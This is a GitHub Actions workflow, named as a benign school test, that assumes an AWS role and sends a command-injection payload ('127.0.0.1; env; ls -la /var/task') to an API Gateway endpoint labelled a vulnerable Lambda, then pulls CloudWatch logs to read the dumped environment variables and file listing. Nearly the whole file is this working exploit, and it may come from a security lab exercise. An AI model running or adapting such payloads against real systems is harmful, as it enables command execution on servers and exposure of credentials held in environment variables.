name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda
        run: |
          API_ID="3q931syi7b"
          REGION="us-east-1"
          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
          
          # Payload with command injection - let's dump environment variables or list files in /var/task
          PAYLOAD='{"domain": "127.0.0.1; env; ls -la /var/task"}'
          
          echo "=== 1. TRIGGERING ENDPOINT ==="
          curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "$PAYLOAD"
          
          echo ""
          echo "=== 2. WAITING 3 SECONDS FOR LOGS TO FLUSH ==="
          sleep 3
          
          echo "=== 3. FETCHING CLOUDWATCH LOGS ==="
          # Pull the most recent log events from the Lambda's log group
          aws logs tail /aws/lambda/nslookupv2 --region ${REGION} --since 1m
